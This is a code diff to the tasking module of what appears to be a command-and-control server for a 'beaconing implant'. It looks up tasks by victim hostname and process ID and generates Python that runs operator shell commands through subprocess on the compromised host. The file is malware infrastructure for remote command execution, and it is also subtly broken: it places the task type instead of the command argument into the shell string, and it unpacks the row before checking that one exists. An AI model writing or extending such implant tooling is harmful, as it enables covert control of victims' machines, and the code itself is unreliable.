@@ -22,10 +22,18 @@ class Tasking(object):
     def check_tasking(self):
         '''
             Description: Checks if anything is tasked for the beaconing implant
-            Returns: Tuple that contains task information
         '''
         with self.connection.cursor() as cursor:
-            cursor.execute("SELECT * FROM `tasks` WHERE `hostname` = %s AND `process_id` = %s", (self.hostname, self.process_id))
-            self.task = cursor.fetchone()
+            cursor.execute("SELECT `task_action`, `task_secondary` FROM `tasks` WHERE `hostname` = %s AND `process_id` = %s", (self.hostname, self.process_id))
+            self.task_action, self.task_secondary = cursor.fetchone()
+            row_count = cursor.rowcount
 
-        return self.task
+        # if something is tasked
+        if row_count == 1:
+            # if tasked action is "command"
+            if self.task_action == "command":
+                self.generate_command_code()
+
+    def generate_command_code(self):
+        command = "import subprocess; process = subprocess.Popen('" + self.task_action + "', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE); output, error = process.communicate(); print output, error;"
+        print(command)
